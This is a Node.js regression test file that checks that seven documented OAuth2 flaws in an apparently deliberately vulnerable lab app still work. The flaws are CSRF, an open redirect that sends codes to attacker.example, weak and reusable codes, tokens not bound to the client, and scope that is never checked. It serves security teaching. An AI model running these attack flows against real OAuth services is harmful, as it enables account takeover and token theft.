// Automated regression tests for PoC1-7 in
// doc/OAuth2_PoC_Verification_Report.md, written as a safety net ahead of
// the Node 8 -> Node 22+ base image bump. Node built-ins only (node:test,
// node:assert, fetch) -- see helpers.js for how to run this against a live
// stack (needs gallery + mongodb + mongoseed + photoprint, since PoC1 is a
// photoprint-side vulnerability, not a gallery-side one).
//
// These check that each documented vulnerability *still behaves the same
// way*, not that it's been fixed -- this app is deliberately vulnerable.

const test = require('node:test');
const assert = require('node:assert/strict');
const {
  GALLERY, PHOTOPRINT, CLIENT_ID, CLIENT_SECRET,
  MALICIOUS_CLIENT_ID, MALICIOUS_CLIENT_SECRET, REDIRECT_URI,
  makeJar, fetchNoRedirect, login, registerFreshUser, authorize,
  getAuthorizationCode, exchangeCode, locationParams,
} = require('./helpers');

test('PoC1: CSRF -- photoprint /callback has no state check, so a code obtained under one identity hijacks whichever browser opens the callback URL', async (t) => {
  // Attacker: fresh gallery account with an empty photo gallery, so its
  // absence in the victim's photoprint session is unambiguous evidence of
  // the hijack (rather than just "some code worked").
  const attackerJar = makeJar();
  await registerFreshUser(attackerJar);
  const code = await getAuthorizationCode(attackerJar); // redirect_uri = photoprint's real /callback

  // Victim: a completely separate, cookie-less photoprint session opens the
  // attacker's captured callback URL directly.
  const victimJar = makeJar();
  const callbackRes = await fetchNoRedirect(victimJar, `${PHOTOPRINT}/callback?code=${code}`);
  assert.equal(callbackRes.status, 302);
  assert.match(callbackRes.headers.get('location'), /\/selectphotos$/);

  const photosRes = await fetchNoRedirect(victimJar, `${PHOTOPRINT}/selectphotos`);
  const body = await photosRes.text();
  // selectphotos.pug's unpiped "No photos found!" line gets parsed by
  // pug/jade as a literal <No> tag wrapping "photos found!" -- a
  // pre-existing template quirk, not something this test is about.
  assert.match(body, /photos found!/,
      'victim\'s photoprint session ended up bound to the attacker\'s (empty) gallery account -- CSRF succeeded');
});

test('PoC2: open redirect + code injection -- redirect_uri is never checked against the client\'s registration, at either the authorize or token endpoint', async (t) => {
  const jar = makeJar();
  await login(jar); // koen, the "victim" here, already has a gallery session

  const evilRedirect = 'http://attacker.example/callback';
  const res = await authorize(jar, 'code', {redirect_uri: evilRedirect});
  const {params} = locationParams(res);
  assert.match(res.headers.get('location'), new RegExp(`^${evilRedirect}`),
      'gallery redirected the code to an arbitrary, unregistered redirect_uri');
  const stolenCode = params.get('code');
  assert.ok(stolenCode);

  // The "attacker" now redeems the stolen code using a *different*
  // redirect_uri (photoprint's real one) than the one it was issued under.
  const tokenRes = await exchangeCode(stolenCode, {redirectUri: REDIRECT_URI});
  assert.equal(tokenRes.status, 200,
      'token exchange must not validate that redirect_uri matches the one used to obtain the code');
  const tok = await tokenRes.json();
  assert.ok(tok.access_token);
});

test('PoC3: authorization codes are weak (drawn from a 1..99999 numeric range)', async (t) => {
  const jar = makeJar();
  await login(jar);
  const code = await getAuthorizationCode(jar);
  assert.match(code, /^[0-9]+$/, 'code should be a plain decimal integer, not a high-entropy token');
  const n = Number(code);
  assert.ok(n >= 1 && n <= 99999,
      `code ${code} outside the documented 1..99999 range -- entropy may have improved`);
});

test('PoC4: an authorization code is not bound to the client that requested it', async (t) => {
  const jar = makeJar();
  await login(jar);
  const code = await getAuthorizationCode(jar); // issued to CLIENT_ID (photoprint)

  const res = await exchangeCode(code, {
    clientId: MALICIOUS_CLIENT_ID,
    clientSecret: MALICIOUS_CLIENT_SECRET,
  });
  assert.equal(res.status, 200,
      'a code issued to one client should not be redeemable by a different client, but this app allows it');
  const tok = await res.json();
  assert.ok(tok.access_token);
});

test('PoC5: an authorization code can be redeemed more than once', async (t) => {
  const jar = makeJar();
  await login(jar);
  const code = await getAuthorizationCode(jar);

  const first = await exchangeCode(code);
  assert.equal(first.status, 200);
  const second = await exchangeCode(code);
  assert.equal(second.status, 200,
      'the same code succeeded a second time -- codes are never invalidated after use');
});

test('PoC6: a refresh_token is not bound to the client that obtained it', async (t) => {
  const jar = makeJar();
  await login(jar);
  const code = await getAuthorizationCode(jar, {scope: 'view_gallery offline_access'});
  const tokenRes = await exchangeCode(code);
  const tok = await tokenRes.json();
  assert.ok(tok.refresh_token, 'expected a refresh_token for an offline_access-scoped code');

  const res = await fetch(`${GALLERY}/oauth/token`, {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: new URLSearchParams({
      grant_type: 'refresh_token',
      refresh_token: tok.refresh_token,
      client_id: MALICIOUS_CLIENT_ID,
      client_secret: MALICIOUS_CLIENT_SECRET,
    }),
  });
  assert.equal(res.status, 200,
      'a refresh_token issued to one client should not be redeemable by a different client, but this app allows it');
  const refreshed = await res.json();
  assert.ok(refreshed.access_token);
});

test('PoC7: the resource server never validates an access_token\'s scope, so a view_gallery-only token can still write', async (t) => {
  const jar = makeJar();
  await login(jar);
  const code = await getAuthorizationCode(jar); // scope=view_gallery only, no edit_picture
  const tokenRes = await exchangeCode(code);
  const {access_token: token} = await tokenRes.json();

  const listRes = await fetch(`${GALLERY}/photos/koen?access_token=${token}`, {
    headers: {Accept: 'application/json'},
  });
  const {images} = await listRes.json();
  assert.ok(images.length > 0, 'need at least one seeded photo to target');
  const target = images[0];
  const originalDescription = target.description;

  try {
    const putRes = await fetch(`${GALLERY}/photos/koen/${target._id}?access_token=${token}`, {
      method: 'PUT',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: new URLSearchParams({description: 'pwned by integration test'}),
    });
    assert.equal(putRes.status, 204,
        'a view_gallery-scoped token should not be able to PUT (edit_picture), but ensureScope is never applied');

    const checkRes = await fetch(`${GALLERY}/photos/koen/${target._id}`, {headers: {Accept: 'application/json'}});
    const {image} = await checkRes.json();
    assert.equal(image.description, 'pwned by integration test');
  } finally {
    // Non-destructive: restore the seed data for any later test run.
    await fetch(`${GALLERY}/photos/koen/${target._id}?access_token=${token}`, {
      method: 'PUT',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: new URLSearchParams({description: originalDescription}),
    });
  }
});
